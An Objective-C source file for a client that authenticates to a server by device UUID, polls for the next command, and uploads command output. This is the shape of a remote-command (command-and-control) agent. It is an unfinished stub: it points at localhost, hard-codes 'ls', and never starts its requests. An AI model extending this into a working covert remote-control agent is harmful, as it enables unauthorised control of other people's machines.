//
//  MSAPI.m
//  metast.sys
//
//  Created by Nikola Tesla on 2/27/16.
//  Copyright © 2016 WireTech. All rights reserved.
//

#import "MSAPI.h"
#import "MSClient.h"

@implementation MSAPI

NSString const *MSBaseURL = @"http ://127.0.0.1:8080/";

+ (void)authenticate:(void (^)(BOOL))handler {
    MSClient *client = [MSClient sharedClient];
    NSDictionary *body = @{@"uuid": client.UUID};
    [self post:@"authenticate" body:body handler:^(id  _Nullable response, NSError * _Nullable error) {
        handler(YES);
    }];
}

+ (void)nextCommand:(void (^)(MSCommand * _Nonnull))handler {
    [self post:@"command/next" body:nil handler:^(id  _Nullable response, NSError * _Nullable error) {
        MSCommand *command = [[MSCommand alloc] initWithCommand:@"ls"];
        handler(command);
    }];
}

+ (void)updateCommandOutput:(MSCommand *)command handler:(MSAPIHandler _Nullable)handler {
    NSDictionary *body = @{@"output": command.output};
    [self post:[NSString stringWithFormat:@"command/%@/output", command.identifier.stringValue] body:body handler:^(id  _Nullable response, NSError * _Nullable error) {
        
    }];
}

+ (void)didFinishRunningCommand:(MSCommand *)command handler:(MSAPIHandler)handler {
    [self post:[NSString stringWithFormat:@"command/%@/finished", command.identifier] body:nil handler:^(id  _Nullable response, NSError * _Nullable error) {
        
    }];
}

+ (void)post:(NSString *)URL body:(id __nullable)body handler:(MSAPIHandler)handler {
    NSURL *fullURL = [NSURL URLWithString:[NSString stringWithFormat:@"%@%@", MSBaseURL, URL]];
    NSMutableURLRequest *request = [[NSMutableURLRequest alloc] initWithURL:fullURL];
    request.HTTPMethod = @"POST";
    
    if (body)
        request.HTTPBody = [NSJSONSerialization dataWithJSONObject:body options:0 error:nil];
    
    [[NSURLSession sharedSession] dataTaskWithRequest:request completionHandler:^(NSData * __nullable data, NSURLResponse * __nullable response, NSError * __nullable error) {
        
        if (error)
            return handler(nil, error);
        
        NSError *JSONError;
        id JSONObject = [NSJSONSerialization JSONObjectWithData:data options:0 error:&JSONError];
        
        if (JSONError)
            return handler(nil, JSONError);
        
        handler(JSONObject, nil);
    }];
}
@end
